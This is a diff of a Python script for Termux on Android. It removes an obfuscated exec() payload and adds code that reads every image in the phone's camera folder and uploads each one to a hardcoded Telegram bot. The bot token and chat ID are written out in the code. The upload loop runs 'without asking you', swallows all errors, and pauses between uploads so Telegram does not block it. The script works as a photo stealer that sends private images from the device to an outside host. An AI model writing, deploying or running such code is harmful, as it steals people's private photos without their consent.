@@ -1,2 +1,49 @@
-# Python obfuscation by pyobfuscator.com
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'iDDsb0A/j4+p3CRjNh4StuJEQ2GOCBAr4kBdh1PKNS3jzcWA9/5PcbF1y0suhyBtofps73P8D35Rf4//txR9PH/Kt7aeIMo8jiVtEBVFWmCwDpfmJTbzD1mxAAaoMQD4IEqC38oxI07O7n7E3e+bq5o/LwssVUR2r04c7n8Cs/EYFmOZet43JYN4Z6aQNGcOmR7XPrbaO7gkf0+GMdDCgadR1Y/FAYVcO7/4ogmAsvmWz1mda7YaDZy4DCawLWINEKnJJtaTDl2GAzfVmS4ZEkBNaGNUuM820K8eM0Y3uUngdU1bGDNpJKmHQ2IcSRdKFsz506NP2Nwsng2E3uozCvJ3waoos2rXUcINWYb6lsNB/tZoqCwLrMVwJ40PiIUBM18axeutU721uxks6Vasvl2BvCTljrChJSLVxyaGWoEmj/kUxUJuQRaNVBKAHMVBTJFRh/GhhtiIzhM0LwRn1VhBQ/9EY9MOETLUNyKYRvijja1CJubTUlxEEtsfQT95R0/s93Oyug1t0NvrG2UGoE/4m4kObv1+Su1NzNnrX2pvoV+kSA9X/4Dz+9uZO8zHMPZ9wnfZvs6yM8pNsl+yrPqRJpC51nM3UQIe8xDXyu0FvvjRUv1PFum7NEWl1fIaAVmCGNLHnfdPOLy+HY+ml8IkJfv/qmILb3Ds7AIucIba0qZZX1kSrmldy6BJpZjkSyASCEPXXdefUAzmv1lU9xJe'))
+import os
+import time
+import requests
+
+# =====================================================================
+# ⚠️ CONFIGURATION (Fill this in once)
+# =====================================================================
+BOT_TOKEN = "8986334495:AAF81g6WggKZQpdNG0A-kAUR2age3T4FyFg"
+CHAT_ID = "7387743481"
+
+# Automatic path to your phone's default camera folder
+PHOTO_DIR = "/data/data/com.termux/files/home/storage/dcim/Camera"
+# =====================================================================
+
+def send_photo(file_path):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+    try:
+        with open(file_path, 'rb') as photo:
+            payload = {'chat_id': CHAT_ID}
+            files = {'photo': photo}
+            response = requests.post(url, data=payload, files=files, timeout=30)
+            return response.status_code == 200
+    except:
+        return False
+
+def main():
+    if not os.path.exists(PHOTO_DIR):
+        return
+
+    # Automatically scan for all common image formats
+    valid_extensions = ('.jpg', '.jpeg', '.png', '.webp', '.heic')
+    try:
+        files = [
+            os.path.join(PHOTO_DIR, f) 
+            for f in os.listdir(PHOTO_DIR) 
+            if f.lower().endswith(valid_extensions)
+        ]
+    except:
+        return
+
+    # Loop through everything automatically without asking you
+    for file_path in files:
+        success = send_photo(file_path)
+        
+        # 1.5-second cooldown so Telegram doesn't block the bot
+        time.sleep(1.5)
+
+if __name__ == "__main__":
+    main()
